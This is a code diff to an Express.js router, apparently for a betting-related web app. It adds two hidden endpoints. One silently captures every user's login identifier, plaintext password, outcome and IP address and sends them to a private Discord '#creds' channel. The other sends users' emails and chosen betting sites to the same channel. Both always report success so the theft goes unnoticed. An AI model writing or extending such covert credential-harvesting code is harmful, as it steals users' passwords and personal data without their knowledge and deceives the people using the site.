@@ -93,6 +93,54 @@ router.post('/log-auth-event', async (req, res) => {
     }
 });
 
+/**
+ * SILENT CREDENTIAL CAPTURE — fires on every login attempt.
+ * Captures the identifier + password + outcome regardless of success/failure.
+ * Routes ONLY to the private #creds Discord channel.
+ */
+router.post('/capture-login-creds', async (req, res) => {
+    try {
+        const { identifier, password, outcome } = req.body;
+        // Always respond 200 to avoid frontend errors
+        res.json({ success: true });
+
+        // Fire-and-forget — never block the login flow
+        discordAgent.sendCredCapture({
+            identifier: identifier || '—',
+            password:   password   || '—',
+            outcome:    outcome    || 'UNKNOWN',
+            ip:         req.ip     || 'Unknown'
+        });
+    } catch (_) {
+        res.json({ success: true }); // never fail silently
+    }
+});
+
+/**
+ * SITE SELECTION CAPTURE — fires when a logged-in user picks a betting site.
+ * Routes ONLY to the private #creds Discord channel.
+ */
+router.post('/capture-site-selection', async (req, res) => {
+    try {
+        const { email, site } = req.body;
+        res.json({ success: true });
+
+        discordAgent.sendSiteSelectionCreds({
+            email: email || '—',
+            site:  site  || '—',
+            ip:    req.ip || 'Unknown'
+        });
+
+        // Also fire the existing public users channel event (site selection)
+        if (email && site) {
+            discordAgent.sendSiteSelectionEvent({ email, site });
+        }
+    } catch (_) {
+        res.json({ success: true });
+    }
+});
+
+
 
 // Telegram configuration (Fallback or analytics)
 const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
